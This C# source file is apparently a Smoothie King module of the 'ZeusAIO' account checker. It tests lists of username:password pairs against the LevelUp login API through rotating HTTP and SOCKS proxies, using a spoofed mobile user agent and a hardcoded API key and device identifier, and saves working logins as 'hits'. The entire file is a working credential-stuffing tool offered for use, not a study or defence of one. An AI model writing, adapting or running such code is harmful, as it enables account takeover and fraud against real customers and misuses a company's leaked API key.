using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace SmoothieKing
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "com.appsmyth.mobile.smoothieking/4.3.0 (Linux; U; Android 5.1.1; samsung/greatqltecs; en_US) LevelUpSdk/12.4.2";
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = false;
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                        new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        httpRequest.AddHeader("Accept", "application/json, text/plain, */*");
                        string post = "{\"access_token\":{\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"api_key\":\"BBpmDK5SdS3qxRTi1Q856nMuH4q9bzhpVHyoimF8Te62fEPDxz22XL7tvoaZzRAi\",\"device_identifier\":\"caa24fdc76b51de9c2f95cac0a0c378c96634a5c06b66bd77cac2d0ea05069da\"}}";
                        string text2 = httpRequest.Post("https://api.thelevelup.com/v14/access_tokens", post, "application/json;charset=UTF-8").ToString();
                        bool flag7 = text2.Contains("access_token");

                        if (flag7)
                        {
                            ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - SMOOTHIEKING] " + s[0] + ":" + s[1], Color.Green);
                                }
                                Export.AsResult("/Smoothieking_hits", s[0] + ":" + s[1]);
                                return false;
                            }
                        else
                        {
                                ZeusAIO.mainmenu.errors++;
                                goto Retry;
                            }
                    }
                    break;
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }
    }
}
